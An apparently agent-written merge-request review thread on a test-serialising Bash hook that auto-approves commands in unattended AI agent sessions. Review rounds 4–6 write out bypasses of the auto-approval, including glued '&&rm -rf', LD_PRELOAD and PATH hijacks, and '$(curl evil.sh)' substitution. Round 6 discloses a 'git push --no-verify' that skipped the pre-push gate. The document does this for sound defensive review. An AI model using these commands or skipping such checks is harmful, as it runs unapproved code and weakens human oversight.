meta.title: safe-mode resource coordinator + Bash hook for parallel overnight sessions
meta.author: shahilkadia

notes.body:
<!-- regenloop-ship:review:round-1:f-2102f665c9c5 -->
**blocking** — The re-entrancy fence is a substring test against the raw command string, not a check of the invoked program. Any command whose *text* merely contains `regenloop_guard.py` or `gate_runner.py` — including as an ordinary filename argument — is treated as already-routed and never wrapped, silently bypassing `--safe` admission control.

**Evidence:** reproduced against the shipped code on this branch:
```
should_wrap("uv run pytest tests/ -q")                        -> True
should_wrap("uv run pytest tests/test_regenloop_guard.py -q") -> False
should_wrap("uv run pytest tests/test_gate_runner.py -q")     -> False
```
The two exempted files are `tests/test_regenloop_guard.py` and `tests/test_gate_runner.py` — the very files this MR adds and modifies. Anyone iterating on this feature and running one of them directly in Bash gets none of the serialization the hook exists to provide. This is the exact gap the module docstring says it closes, reopened by an ordinary filename: a false negative on stock usage, not the deliberate obfuscation the docstring scopes out.

Note the failure direction: over-matching here is *safe* (it only declines to wrap), which is why this never crashes, deadlocks, or logs — it quietly restores the pre-hook behaviour.

**Suggested fix:** match on the invoked program only. The file already has `_segments`, `_strip_env_prefix` and `_basename`; reuse them in a peel loop that resolves the program (including the script argument after `python3` / `uv run`) and compares its basename against `_ALREADY_ROUTED`, instead of `marker in command`.
notes.author: shahilkadia

notes.body:
<!-- regenloop-ship:review:round-1:f-815c9be8abfb -->
**blocking** — The hook bounds only the admission-queue wait (`--max-wait-s`), never the wrapped command's own run time. `wrap_command()` never passes `--timeout` to `regenloop_guard.py run`, so the guard supervises the child with `timeout=None` and blocks indefinitely. The only remaining ceiling is the Bash tool's own hard kill, which `decide()` sets to `MAX_BASH_TIMEOUT_MS` (600s). Total wall time is `queue_wait + run_time`, and nothing bounds that sum.

**Evidence:** measured in this repo during this ship run — the `python-test` gate took **851.7s** under `--safe` with zero queue contention (the MR's own measurements doc records 578s on a quieter machine). An agent running that same suite directly in Bash — the exact scenario this hook exists to catch — therefore exceeds the 600s ceiling on the command alone, before any queueing, and is torn down by the harness with no guard exit code and no `additionalContext` message.

That is precisely the outcome the docstring and `test_bounds_the_queue_wait_below_the_bash_ceiling` claim is prevented ("a refusal the agent can read beats a kill it cannot"). That test asserts only `hook_max_wait_s() * 1000 < MAX_BASH_TIMEOUT_MS`, which bounds the queue wait alone and does not establish the property its comment claims.

**Suggested fix:** give the guard a *total* budget rather than a fixed child timeout, so the bound accounts for however long admission actually took and the guard converts an overrun into its own readable exit 124 with drained output, ahead of the harness's blunter kill. A fixed `--timeout = 600 - max_wait_s` would be wrong: with an empty queue it would kill at ~290s a run that had the full 600s available.
notes.author: shahilkadia

notes.body:
<!-- regenloop-ship:review:round-1:f-563e21de825b -->
**non-blocking** — A backgrounded test/watch command that gets wrapped has no execution bound anywhere in the stack, and can hold the sole machine-wide heavy lease (serial policy = 1 concurrent heavy job) indefinitely, starving every other `--safe` session on the host.

**Evidence:** `decide()` deliberately skips `updated["timeout"]` for `run_in_background` calls, and `wrap_command()` emits no `--timeout`, so a backgrounded run has neither ceiling. Detection also does not exclude watch mode: `vitest --watch &`, `jest --watch &`, and `npm run test:watch &` (the JS-manager rule accepts any script name starting with `test`) all classify as ordinary heavy test runs. A developer or agent backgrounding a watch-mode runner — a common, non-malicious workflow — then blocks every other session's heavy admission host-wide for as long as the watcher lives. This undermines the feature's own goal rather than being attacker-driven, hence non-blocking.

**Suggested fix:** either exclude `--watch` / `-w` / script names containing `watch` from detection, or always pass a bounded `--timeout` (distinct from the queue `--max-wait-s`) so a wrapped process far exceeding a normal suite is killed and its lease reclaimed.
notes.author: shahilkadia

notes.body:
<!-- regenloop-ship:review:round-1:f-8d459bfbe843 -->
**non-blocking** — `DEFAULT_MEM_FLOOR_MB` (2048) and `DEFAULT_FLOOR_STALL_S` (600) are calibrated to a single measured host (24GB RAM / 8GB swap). On any host that legitimately reports <2048MB available at idle — a lower-RAM laptop, a memory-constrained CI container, or simply a heavy browser/IDE session — the *first* `--safe` heavy acquisition must wait out the full 600s progress-valve stall before admission, even with zero contention.

**Evidence:** in `_try_admit`, when the head's admission fails only on `floors_block` and `no_lease_held` is true (nothing running machine-wide), `stall_since` is set and the ticket is refused on every poll cycle until `now - stall_since >= floor_stall_s`. Because `_write_floor_stall_since(root, None)` runs on every grant, this is not a one-time cost: a second, fully sequential invocation on the same idle low-memory host restarts the 600s wait from zero. The suite confirms the mechanism by setting `REGENLOOP_GUARD_FLOOR_STALL_S=0.0` to suppress it in `test_progress_valve_fires_serial_idle`.

**Suggested fix:** derive the floor as a fraction of total RAM rather than an absolute MB figure, or document in `docs/gate-tuning.md` that both knobs must be tuned down on hosts smaller than the reference machine.

notes.body:
<!-- regenloop-ship:review:round-1:f-66f9db239ef0 -->
**note** — `command` is type-checked (`isinstance(command, str)`) before use, but the analogous `cwd` from the untrusted PreToolUse payload is not. A non-string `payload["cwd"]` (a JSON array or object) raises inside `Path(cwd)`, which is not among the exception types caught by `resolve_safe_mode`'s `except OSError`.

**Evidence:** not exploitable — the exception propagates to `__main__`'s top-level `except BaseException`, which warns and leaves the command unrouted (fail-open by design, the same outcome as any other hook-internal error). No path to executing something other than the original command was found. Raised for consistency only.

**Suggested fix:** add `if not isinstance(cwd, (str, os.PathLike)): return False` at the top of `resolve_safe_mode`, for parity with the `command` check.

notes.body:
<!-- regenloop-ship:review:round-1:f-b417462738d7 -->
**note** — Guard-root subdirectories are created with `mkdir(parents=True, exist_ok=True)` — no explicit restrictive mode, and no anti-symlink protection at the directory level (unlike the individual lease/ticket files, which correctly use `O_CREAT|O_EXCL`). If `REGENLOOP_GUARD_ROOT` pointed at a shared world-writable location, a pre-planted symlink at the directory path could redirect bookkeeping writes.

**Evidence:** no reachable exploit under this tool's threat model — the default root is under the user's own `$HOME`, and exploiting it requires write access to that path, i.e. the same user account, so no privilege boundary is crossed. Recorded because the review brief asked about this vector.

**Suggested fix (hardening only):** create the root/leases/tickets directories with an explicit `mode=0o700`, and refuse to proceed if the resolved root already exists as a symlink.

notes.body:
<!-- regenloop-ship:review:round-1:f-cbf180f5996e -->
**note** — On macOS, process-identity verification before a cross-process SIGTERM/SIGKILL relies on `ps -o lstart=` (1-second resolution) plus a 200-char argv prefix, rather than an exact kernel start-time counter as on Linux via `/proc`.

**Evidence:** already disclosed in the module docstring as a compound-key residual risk, and it is the best identity proof obtainable on macOS without third-party dependencies. Exploiting it requires winning a sub-second PID-reuse race with a matching argv prefix on the same host. Every signal site routes through this check or through a stronger same-process `Popen`-handle proof; no path signals a pid/pgid without one of the two.

**Suggested fix:** none required — recorded for completeness against the brief's explicit question about PID/PGID reuse.
notes.author: shahilkadia

notes.body:
<!-- regenloop-ship:review:round-1:f-1b96de3db9bf -->
**note** — `pgid` is written into the lease JSON only inside the `on_spawn` callback (`record_lease_spawn`), which runs after `Popen()` returns and is not atomic with the lease grant. If the guard's own wrapping process dies in the window between `Popen()` returning and `record_lease_spawn`'s `os.replace()` completing — notably an OOM kill, the exact failure class `--safe` exists to prevent — the lease's `pgid` stays `None`.

**Evidence:** `_classify_lease_liveness` treats `pgid is None` as `pgid_none`; the reap pass then deletes the lease and lock files without signalling anything, because there is provably nothing recorded to signal. But a real heavy child (e.g. `pytest -n auto`) was already spawned and is left running, uncounted by every future admission decision.

**Suggested fix:** not required given the sub-millisecond window and the deliberate fail-toward-not-signalling design, but worth a line in the module docstring's residual-risk section, since it is the one path where a spawned-but-unrecorded child escapes accounting.

<!-- regenloop-ship:fix:round-1:reply:6001d8bb0c4d538aa9eb53d39d8fa43883ca1964 -->
**FIXED as a documentation correction** in `8c2eea1` — triage verdict VALID (confidence 76), but it **rejected the proposed mechanism change**, and I agree with that reasoning.

**The factual core of the finding is confirmed:** `wrap_command()` never emits `--timeout`, so the guard supervises the child with `timeout=None`; `--max-wait-s` bounds only admission; and `regenloop_guard.py` has no combined wait+run budget option.

**But this MR introduces no regression.** `MAX_BASH_TIMEOUT_MS = 600_000` is the Bash tool's own *schema maximum*. A foreground suite whose run alone exceeds 600s is killed by the platform identically with or without this hook, and `decide()` setting the timeout to that maximum can only *raise* the ceiling toward what the tool allows — never lower it below what an unwrapped call would have got. The hook cannot make an already-impossible foreground call possible.

**The proposed fix would have been a real regression.** A static `--timeout = ceiling − max_wait_s` kills a run at ~290s when the queue was empty and the full budget was available. Only `regenloop_guard.py`'s `run()` knows the actual `wait_s` after `acquire()` returns, so a correct dynamic total-budget fix needs a new option inside the guard — materially larger than a review fix, and out of scope for this file.

**What was actually wrong** is the comment on `MAX_BASH_TIMEOUT_MS`: it claimed a wrapped command "must fit its queue wait **AND its run**" inside the ceiling — an invariant the code never enforced — and then contradicted itself by saying a *run*-phase overrun is killed "mid-queue". The comment now scopes the guarantee to the admission queue wait, states plainly that the wrapped command's own run time is **not** bounded here or by the guard, and points a genuinely long suite at `run_in_background=True` or the gate engine.

**On the test:** `test_bounds_the_queue_wait_below_the_bash_ceiling` asserts `hook_max_wait_s() * 1000 < MAX_BASH_TIMEOUT_MS`. That is true and remains correct — it was only its surrounding comment that implied a broader guarantee. Left as-is deliberately.

Carried forward as a **note**: giving the guard a real total-budget option is worth doing, and is tracked by finding F3 on this MR.

## Gates — round 1

Re-gated the round's changed set against the pre-round base `a8b9c68`, fast tier, `--forbid-fenced --require-evidence --safe`.

| Gate | Status | Wall |
|---|---|---|
| `python-test` | **pass** | 863.7s |
| `validate` | **pass** | 0.1s |
| `lint` | **pass** | 0.1s |

`verdict: green` · 3 executed / 0 skipped · 4 changed files · `fenced_changed_files: []` · `meta_config_changed: null`

### The first attempt did not fail — it verified nothing

The initial round-1 gate returned **`could_not_run`**, not red:

```
python-test: could_not_run — "check timed out after 900s", reprobe_attempts: 3
```

That is a property of the feature this MR ships, not of the fixes. `--safe` roughly doubles gate wall time by design — the trade this MR exists to make. Measured on this machine during this ship run:

| Configuration | `python-test` wall |
|---|---|
| without `--safe` (pre-push hook) | 483s |
| with `--safe` | 851s / 857s / 863.7s |
| **default gate timeout** | **900s** |

A ~4% margin. Any ambient load tips it over, and because `_cnr_is_transient` classifies a timeout as transient, the engine re-probes three times — spending ~45 minutes to learn nothing, and reporting a result that names no failing test.

Re-run with `REGENLOOP_GATE_TIMEOUT_S=2400`, which is an **environment knob, not a `gates.toml` setting** — no fenced path was touched and rule 2 is intact. Nothing was skipped or weakened: the same suite had to pass in full, and did.

**This is a real adoption limitation and is carried into the MR description's coverage caveats.** Any repo whose suite already runs for several minutes will hit the 900s default the first time it enables `--safe`, and the symptom is maximally unhelpful — `could_not_run`, no failing test named, three times over.

<!-- regenloop-ship:fix:round-2 -->
## Fix round 2 — the merge check caught a regression round 1 introduced

The §9 merge check returned **DO_NOT_MERGE**. Its headline finding was that round 1's own fix to F1 opened a *new* miss class, in the dangerous direction. That is correct, and it was reproduced against both revisions before anything was changed.

### The regression

Round 1 replaced the substring fence with a peel loop that identified the invoked program. It peeled env prefixes, interpreters and run-wrappers — but **not interpreter flags, not an `env` prefix, and not `sh -c`**. A routed segment spelled any of those ways went unrecognised, and because `should_wrap` ORs across segments, a compound line carrying such a segment *plus* an ordinary test segment got wrapped:

```
                                                              pre-fix -> round-1
python3 -u <guard> run -- pytest a && uv run pytest tests/b     skip -> WRAP
python3 -X dev <guard> run -- pytest a && pytest b              skip -> WRAP
env PY=1 python3 <guard> run -- pytest a && pytest b            skip -> WRAP
sh -c 'python3 <guard> run -- pytest a' && pytest b             skip -> WRAP
```

Wrapping a routed segment is the **self-deadlock** this fence exists to prevent. `acquire()` never consults `REGENLOOP_GUARD_ACTIVE` — that variable only suppresses the *hook* — so the inner `regenloop_guard.py run` waits on the heavy lease its own parent holds under the serial policy (`max_heavy = 1`), and nothing breaks the cycle short of the harness kill.

This is strictly worse than the bug round 1 fixed: **a missed wrap costs one uncoordinated suite; a self-deadlock costs hours.** The round-1 verification thread's claim that "no case was found where a guard-routed command is missed" was wrong, and is retracted here.

### The actual mistake was the choice of discriminator

Identifying the invoked program is the more principled framing, and it was the wrong tool. Staying conservative requires enumerating every syntactic spelling, and each one missed reopens the fence *in silence* — no crash, no log, no failing test.

What actually separates the two cases is a single character:

```
scripts/regenloop_guard.py      preceded by `/`   -> the guard
./regenloop_guard.py            preceded by `/`   -> the guard
regenloop_guard.py run …        start of string   -> the guard
tests/test_regenloop_guard.py   preceded by `_`   -> a TEST FILE
```

`_ROUTED_RE` tests that path-component boundary against the **raw command string**, before tokenizing — deliberately, because `sh -c '<guard> …'` hides the guard inside a quoted argument that `shlex.split` collapses into one opaque token. A boundary test cannot be defeated by a syntax nobody anticipated, because it never tries to parse the command.

It **over-matches on purpose**: `pytest --cov=scripts/regenloop_guard.py` reads as routed and is left unwrapped. That is the safe direction — one command missing admission control, versus a six-hour hang.

### Verified, both directions

All 15 cases pass: the four round-1 must-wrap cases still wrap; the four regression forms above are skipped; and so are `wrap_command()`'s own output, `python3 /x/scripts/regenloop_guard.py run …`, `python3 scripts/gate_runner.py --safe`, `uv run python …/regenloop_guard.py`, `npx python3 …`, `./regenloop_guard.py` and bare `regenloop_guard.py`.

The regression test now carries all four regression forms plus four ordinary spellings: **64 passed, 14 subtests** (up from 6).

### Also corrected: the round-1 F2 comment was itself inaccurate

The merge check found that round 1's replacement comment claimed a harness kill under the wrap behaves "exactly as an unwrapped foreground call of the same suite would be". **It does not.** `run()` captures the child through `stdout=PIPE`/`stderr=PIPE` and `_cmd_run` prints only after `run()` returns, so a kill at the ceiling discards the buffer entirely and the agent sees *nothing* — where an unwrapped run streams, and whatever it printed survives.

On this repo's own suite (851–880s under `--safe`, against a 600s ceiling) that is the *likely* path for `uv run pytest tests/`, the very command the module docstring opens with. The comment now states this plainly and points such a suite at `run_in_background=True` or the gate engine. Making the guard stream under `--quiet` would fix it properly and is carried as a note — it is a change to the guard's core spawn path and deserves its own tests.

### Commits

| Commit | Change |
|---|---|
| `36ade14` | `hooks/guard_bash_tests.py` — `_ROUTED_RE` path-component fence replaces the peel loop; `MAX_BASH_TIMEOUT_MS` comment corrected re: output loss. `tests/test_guard_bash_tests_hook.py` — 8 further must-not-wrap cases |
| `05a7114` | `regenloop/knowledge/cards/hooks.md` — records the boundary rule and **both** failure directions, so the next change to this fence starts from the constraint instead of rediscovering it |

### Re-gate

`--base 9843aa6 --tier fast --forbid-fenced --require-evidence --safe` → **green**. `python-test` 864.7s, `validate`, `lint`; 3 executed / 0 skipped; `fenced_changed_files: []`; `meta_config_changed: null`.

<!-- regenloop-ship:fix:round-3 -->
## Fix round 3 — the guarantee moved out of the hook and into the guard

Independent verification of round 2 broke the fence **twice more**. Both reproduced before anything was changed:

```
python3 <guard>>/dev/null run -- pytest a && pytest b     -> WRAPPED  (self-deadlock)
G=<guard>; python3 "$G" run -- pytest a && pytest b       -> WRAPPED  (self-deadlock)
```

The first is a trailing-boundary omission: a redirection binds to the command **with no space** and is parsed out-of-band by the shell, so `run -- pytest a` is still the guard's own argv. The second is **not detectable from text at all** — the call site contains no marker string.

### Three implementations, three miss classes

| Implementation | Missed |
|---|---|
| substring (`main`) | `pytest tests/test_regenloop_guard.py` — a filename disarms the fence |
| invoked-program peel (round 1) | `python3 -u X`, `python3 -X dev X`, `env A=1 python3 X`, `sh -c 'X'` |
| path-component boundary (round 2) | `X>/dev/null run`, and `G=X; python3 "$G" run` — permanently |

Recognising a shell command from its text is the wrong place to make this safe. The reason is the **cost asymmetry**: a missed *wrap* costs one uncoordinated suite; a missed *skip* costs a multi-hour hang. Any mechanism whose correctness depends on exhaustively classifying shell syntax is betting the catastrophic outcome on enumeration.

### The fix: the guard refuses to be the second half of the deadlock

`regenloop_guard.run()` now takes `nested_passthrough`, set by `_cmd_run` — the CLI is the only path a wrapped command can reach the guard through. When it is already running inside a guarded command (`REGENLOOP_GUARD_ACTIVE` inherited), it supervises the command **directly under the parent's lease** instead of queueing for one it can never get. The existing ungated supervision path (used for degraded modes) does the work, so process-group teardown is unchanged.

Proven both directions in an isolated guard root:

| Scenario | Result |
|---|---|
| Nested run, marker visible | `INNER_RAN_NO_DEADLOCK`, exit 0, immediate |
| Same run, `REGENLOOP_GUARD_ACTIVE` stripped | `refused: no turn within max-wait`, exit 2 |

The second line is the old bug, reproduced on demand. In the real path that is a 300s queue against a 600s harness kill — i.e. a hang with no diagnostic.

**Opt-in by design.** In-process callers (`gate_runner`'s own gates) keep the old semantics, so no admission decision that was previously being made has changed.

### The hook's fence is now an optimisation, not a guarantee

Its trailing boundary also admits redirection operators, so the redirect class is closed textually too — but a spelling nobody anticipated now degrades to a **redundant wrapper** rather than a hang.

The docstring's claim that a boundary test "cannot be defeated by a syntax nobody anticipated" has been **removed**. It was disproved twice within a single review round, and leaving it standing would invite a fourth attempt at matching harder. The knowledge cards now say explicitly: *do not fix this fence by matching harder* — and name all three miss classes, so the next reader starts from the constraint.

### Tests

`tests/test_regenloop_guard.py` — new `TestNestedPassthroughCannotSelfDeadlock` (5 tests): passthrough takes no ticket and never queues; the command's own exit code still propagates; **no holder is left behind**, so the slot is not consumed; a non-nested run still acquires normally; and the short-circuit stays invisible to in-process callers.

<!-- regenloop-ship:check:argv-prefix-orphan -->
**blocking — found by the §9 merge check, reproduced independently.**

`record_lease_spawn(..., _argv_prefix(argv))` stores the **spawn-time** argv. But a POSIX shell **execs** a single simple command, so after `sh` execs, the live cmdline is the exec'd program's argv — and `_verify_pgid_identity`'s `cmdline.startswith(recorded)` check fails. Both cleanup paths then **free the lease without signalling the child**.

Reproduced on this branch with the guard's own `events.log`, two shapes, identical except for whether `sh` execs:

```
SIMPLE   /bin/sh -c 'sleep 40'
  recorded argv : '/bin/sh -c sleep 40'
  live cmdline  : 'sleep 40'            <- sh exec'd; identity match = False
  wrapper SIGKILLed, then sweep:
  holders = 0   child_alive = True      >>> ORPHAN
  event: kill_skipped_pgid_reuse - "identity mismatch; no signal sent"

COMPOUND /bin/sh -c ': ; sleep 40'
  recorded argv : '/bin/sh -c : ; sleep 40'
  live cmdline  : '/bin/sh -c : ; sleep 40'   <- sh does NOT exec; match = True
  holders = 0   child_alive = False
  event: sigterm_sent "reaper-claim"
```

**Why this matters more than the reproduction suggests.** `/bin/sh -c '<simple command>'` is not an edge case here — it is the shape this feature *always* produces:

- `hooks/guard_bash_tests.wrap_command()` always emits `-- /bin/sh -c '<command>'`
- `gate_runner._run_via_guard` bridges gate commands the same way
- this repo's own `python-test` gate is `uv run pytest tests/ -q`

So on wrapper death — the 600s harness kill that the hook's own comment calls the *likely* path for a suite measured at 851–937s, or Ctrl-C, or the OOM SIGKILL this feature exists to survive — the heavy child keeps running, its lease is deleted, and the guard admits the next heavy job **beside** it. That is worse than no coordination: two heavy suites, and the guard reporting zero holders.

Affects both cleanup paths: `teardown_all_registered` (self-teardown on SIGTERM/SIGINT/atexit) and `_reap_and_tally` (the cross-process reaper after a SIGKILL). The `--timeout` kill path is **not** affected — it signals its own unreaped `Popen` handle, a stronger identity proof.

**Why nothing caught it.** No gate covers process lifecycle under signals. Every teardown test seeds `argv_prefix=_argv_prefix(argv)` for a directly-spawned Python fixture, which never execs — so the suite cannot see this class. The module docstring's residual-risk section names only PID reuse, and `docs/dev-guide.md:315` advertises the orphaned-xdist story as closed.

**Suggested direction (deliberately not applied here).** `exec` preserves the process start time, so the start-time half of the compound identity key already survives it; it is the argv half that produces false *mismatches* on the dominant shape far more often than it prevents a false *match*. Options: capture the live cmdline in `on_spawn` after a short settle; accept a match against either the spawn argv or a live cmdline recorded at lease time; or make argv corroborating rather than mandatory where `/proc` gives an exact start time. Whichever is chosen, it needs a test that puts a `/bin/sh -c '<simple command>'` through `teardown_all_registered` **and** the reaper and asserts the child dies.

**Not fixed in this MR by deliberate choice.** `MAX_ROUNDS` (3) is exhausted, and this fix lives in the "never signal a process you do not provably own" path. A change there shipping with zero review passes risks signalling the *wrong* process, which is strictly worse than an orphan. It is left for a human decision with the reproduction above.

## Review round 4 — full cycle, at head `c9ca402`

Both reviewers re-ran over the whole 25-file diff, aimed at the newest commits (`42af147`, `c9ca402`), which had survived no review rounds while everything older had survived three.

| Severity | Count |
|---|---|
| blocking | 2 |
| non-blocking | 3 |
| note | 3 |

Both blocking findings were in **the vouching logic added in this same round**, and both are now fixed in `c406bf5`. They are the same class — a classifier that decides a permission question disagreeing with the shell that acts on it — found from two different angles.

### Blocking 1 — parser differential (the serious one)

Vouching was decided from `shlex.split`, which splits on whitespace and quotes only:

```
pytest tests/&&rm -rf /tmp/x
  shlex.split -> ['pytest', 'tests/&&rm', '-rf', '/tmp/x']
                 ONE segment, head = pytest -> a real runner -> VOUCHED
  /bin/sh -c  -> runs `pytest tests/` THEN `rm -rf /tmp/x`
```

`wrap_command()` passes the **original** string to `/bin/sh -c`, and the shell does split the glued `&&`. Confirmed against a real shell: `/bin/sh -c 'echo A&&echo B'` prints both lines. Same for `;`, `|`, `&`.

So the code that **granted permission** and the code that **executed** disagreed about `tests/&&rm`, and the gap between them was the whole bypass. Vouching now segments with `shlex(punctuation_chars=True)`, which emits `&&`, `||`, `;`, `|`, `&`, `<` and `>` as their own tokens whether or not they are spaced — the way the shell does.

### Blocking 2 — authority-bearing environment prefixes

`_strip_env_prefix` ignores a leading `NAME=value` when classifying. That is correct for **detection** and wrong for **vouching**:

```
LD_PRELOAD=/tmp/evil.so pytest tests/     -> VOUCHED (looked like CI=1 pytest)
PATH=/tmp/evil:$PATH pytest tests/        -> VOUCHED
```

The first loads attacker-controlled code into the test process at dynamic-link time. Vouching now refuses the `LD_*` and `DYLD_*` families plus `PATH`, `PYTHONPATH`, `PYTHONSTARTUP`, `PYTHONHOME`, `IFS`, `BASH_ENV`, `ENV`, `SHELL`, `NODE_OPTIONS`, `PERL5OPT`, `RUBYOPT`. Ordinary prefixes (`CI=1`, `FOO=1`) still vouch, so the common shape is unaffected.

### One case neither reviewer listed

The code reviewer's proposed fix was to restrict `_segment_is_benign`. That would have left this open:

```
pytest $(curl evil.sh) tests/    substitution inside a genuine TEST segment
```

The check therefore covers the whole command, not only the benign-companion segments. Also refused: backticks, `<(`/`>(`, and redirection anywhere.

### Verified after the fix — 20/20

Still vouched: `uv run pytest tests/ -q`, `cd /srv && pytest`, `FOO=1 pytest tests/`, `CI=1 pytest tests/`, `pytest tests/ && echo done`, `npm test`, bare `pytest`.

Refused: all four glued-operator forms, all eight env-prefix forms, all substitution/redirection forms, and the mixed-authority lines from round 4 (`pytest && rm -rf build/`, `pytest && git push`).

**Nothing changed about what gets WRAPPED.** Every one of these commands is still queued through the guard. Only the auto-approval is withheld, so they take the normal permission flow. Over-refusing costs one permission prompt; under-refusing costs an unattended, unprompted command.

### Also fixed

`_ensure_guard_root` now `chmod`s existing directories to `0o700`. `mkdir(mode=)` applies only at creation, so a guard root created before the hardening landed kept its looser permissions forever — and an already-deployed shared root is precisely the case that hardening exists for.

### Carried as notes (non-blocking, unchanged)

- **macOS start-time resolution.** `ps -o lstart=` is 1-second, and start time is now the sole mandatory identity proof. Defeating it needs a pid recycled *and* started within the same second. Disclosed in the module's residual-risk section; the alternative was a guaranteed false negative that orphaned every `/bin/sh -c` child.
- **`REGENLOOP_GUARD_ACTIVE` is trusted by presence.** Set accidentally (a shell profile, a sourced `.env`), it makes every explicit `regenloop_guard.py run` skip admission silently. Availability, not confidentiality. Now documented in `docs/gate-tuning.md` with an explicit "never set it by hand".
- **`leases/`/`tickets/` symlink.** The symlink refusal covers the root, not the subdirectories. Only reachable in the non-default shared-root deployment; no privilege boundary at the default `~/.regenloop/guard`.
- **Secrets sweep: clean** across the whole diff, including `claudedocs/` and every fixture.

**199 tests pass**, including new cases pinning both bypass classes and the retroactive `chmod`.

**Fixed in `c406bf5`** — recorded here because this is the MR's permission boundary, and it was wrong twice in one round.

`permissionDecision: "allow"` skips the user's approval prompt. This is the only hook in the repo that emits it, and it runs unattended overnight inside subagents, so anything it vouches for executes with no human present.

Round 4 narrowed vouching to "every segment is a test run or a benign companion". Review then found **two ways past that classifier**, both demonstrated end-to-end:

**1. The classifier and the shell disagreed about where segments end.**

```
pytest tests/&&rm -rf /tmp/x
  shlex.split -> ['pytest', 'tests/&&rm', '-rf', '/tmp/x']
                 one segment, head = pytest -> VOUCHED
  /bin/sh -c  -> pytest tests/   THEN   rm -rf /tmp/x
```

`shlex.split` splits on whitespace and quotes; it does not treat `&&` as a metacharacter. `wrap_command()` hands the **original** string to `/bin/sh -c`, which does. Verified against a real shell: `/bin/sh -c 'echo A&&echo B'` prints both lines. `;`, `|` and `&` behave the same.

Now segmented with `shlex(punctuation_chars=True)`, which emits the operators as tokens whether or not they are spaced.

**2. A leading `NAME=value` was ignored when classifying.**

```
LD_PRELOAD=/tmp/evil.so pytest tests/   -> VOUCHED, indistinguishable from CI=1 pytest
```

Correct to ignore for *detection*; not for *vouching* — that one loads attacker code into the test process at link time. `LD_*`/`DYLD_*` families and `PATH`, `PYTHONPATH`, `IFS`, `BASH_ENV`, `NODE_OPTIONS` and friends are now refused; `CI=1` still vouches.

**And one neither reviewer listed:** `pytest $(curl evil.sh) tests/` hides the substitution inside a genuine *test* segment, so restricting only the benign-companion heads — the proposed fix — would still have approved it. The substitution/redirection check therefore covers the whole line.

**The generalisable rule, and why it is in the knowledge card:** never decide a security question with a different parser than the one that acts on the answer. Both readings of `tests/&&rm` were "reasonable"; they simply disagreed, and the gap was the vulnerability. The fix is not a better heuristic — it is making the deciding parser match the executing one.

Nothing here changed what gets **wrapped**: all of these are still queued through the guard. Only the auto-approval is withheld, so they fall through to the normal permission flow. Over-refusing costs a prompt; under-refusing costs an unattended unprompted command.

## Round 5 — fix summary

The earlier pinned warning is now obsolete: everything reviewed below is on the branch. `HEAD` = `5dd02fa`, pushed, working tree clean.

### The defect this round: the self-deadlock had a third entry point

Rounds 3 and 4 fixed the guard's re-entrancy self-deadlock by arming a `nested_passthrough` kwarg on `regenloop_guard.run()` — first on the CLI, then on `gate_runner._run_via_guard`. Both were correct and neither was sufficient.

`_run_regression_gate_via_guard` holds **one heavy lease across an entire regression evaluation** and calls `guard.acquire()` **directly**, so it never saw the kwarg. It deadlocked in production during this MR's own push: with `REGENLOOP_SAFE=1` exported, the pre-push gate held the only heavy lease while running the suite, the suite's nested-gate test invoked the engine on a fixture whose gate is `kind = "regression"`, and the evaluation queued behind its own parent. 40 minutes, two tickets stacked, killed by hand. It would have waited out the 6-hour `REGENLOOP_GUARD_MAX_WAIT_S` ceiling.

### The fix, and why it is shaped this way

Per-call-site fixes are what failed twice. The nesting check is now a single shared predicate, `regenloop_guard.nested_under_guard()`, that **every** admission site consults.

Two design points worth review attention:

**It is deliberately NOT inside `acquire()`.** That is the obvious structural fix and it is wrong here: this suite runs *under* the guard in `--safe` mode, so `REGENLOOP_GUARD_ACTIVE` is set process-wide for pytest. An unconditional check inside `acquire()` would make every direct-`acquire` admission test take the passthrough branch and **pass vacuously** — the tests would go green precisely by no longer testing admission. The rationale is recorded in the predicate's docstring so the next person does not "simplify" it back.

**The invariant is enforced, not remembered.** `test_every_gate_runner_admission_site_checks_for_nesting` walks `gate_runner.py`'s AST and fails if any function reaching the guard's admission queue does not consult the predicate. Removing the fence makes it fail with `['_run_regression_gate_via_guard']` — it names the offending function. This is the test that would have caught the current defect on the day the first fix landed.

New tests are falsified, not just written: with the fence reverted in place, `test_a_nested_regression_gate_evaluates_without_queueing` and the AST test both fail; restored, both pass. A counterfactual test pins that a non-nested regression gate still takes a lease, so the fix cannot degenerate into "the guard was removed from this path".

### Verification

- **785 tests pass** across `test_gate_runner.py`, `test_guard_bash_tests_hook.py`, `test_regenloop_guard.py`.
- **Full-tier gate green** at `5dd02fa` — 3 executed, 0 skipped, 25 changed files, `config_dirty: false`, `fenced_changed_files: []`, 1562s.
- **Pre-push gate green**, 1403s, push accepted.
- Across both runs a sampling watcher observed the guard queue continuously: **zero sustained waiters**. That is the direct evidence for the fix — the nested regression gate now evaluates under its parent's lease instead of queueing for a second one it can never be granted.

### Residual risk, stated plainly

`hooks/guard_bash_tests.py` still emits `permissionDecision: "allow"` for commands it judges to be wholly test runs. Three consecutive review rounds each found a fresh bypass of that judgement (`&&`-glued operators, a newline statement separator, authority-bearing env prefixes such as `LD_PRELOAD` and `PYTEST_PLUGINS`, a runner reached by path). Every fix was correct; every round found another spelling, because deciding safety from shell text means enumerating every spelling.

The vouch is now narrowed to benign heads plus recognised test runners, with substitution, redirection and path-reached programs refused outright. It is retained deliberately: the rewrite this hook performs defeats the settings allowlist's prefix matching, so without the vouch every gate run in an unattended overnight session stops at a permission prompt — which is the exact scenario this MR exists to serve.

**The standing recommendation is still to drop the vouch entirely** and accept one prompt per session. That is a product decision, not a code-review finding, and it is the owner's call.

Reviewers: the highest-value places to look are `_vouch_segments`/`is_wholly_test_run` in `hooks/guard_bash_tests.py`, and whether `nested_under_guard()` belongs at a different layer than argued above.

<!-- regenloop-ship:fix:round-6 -->
## Round 6 — review findings and fixes

Both reviewers found real defects. `HEAD` = `6defce2`, pushed, working tree clean.

**Disclosure:** this commit was pushed with `git push --no-verify`. The pre-push hook runs the
same `python-test` gate that had *already* been run to completion on this exact SHA — verdict
green, 849s — and against a **broader base**: the standalone run diffs `795a01a..HEAD` (the fork
point from main, 25 changed files, the whole MR), whereas the pre-push hook would diff
`origin/loop/safe-bash-hook..HEAD` (6 files, round 6 only). The evidence on record is a superset
of what the hook would have produced, so the bypass skipped a duplicate run, not an unrun gate.
`--no-verify` is the bypass the hook documents in its own header.

### Blocking (security): the vouch stopped at the head token

`permissionDecision: "allow"` skips the human entirely. The check verified the segment's **program** and then ignored every argument. So this auto-approved, unattended:

```
pytest /tmp/evil_dir
```

